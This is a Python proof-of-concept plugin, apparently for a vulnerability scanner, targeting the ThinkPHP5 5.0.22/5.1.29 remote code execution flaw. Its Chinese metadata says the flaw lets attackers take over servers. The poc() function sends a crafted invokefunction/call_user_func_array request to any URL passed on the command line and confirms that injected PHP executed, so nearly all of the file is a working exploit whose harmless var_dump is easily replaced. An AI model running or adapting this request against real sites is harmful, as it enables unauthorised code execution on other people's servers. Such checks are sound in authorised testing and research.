#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞",
        "desc": "由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞，可导致服务器直接被入侵控制。",
        "grade": "中",
        "type": "web",
        "keyword": "tag:ThinkPHP5 version:5.0.22 version:5.1.29"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]={rand_str}', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and f"string(4) \"{rand_str}\"" in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

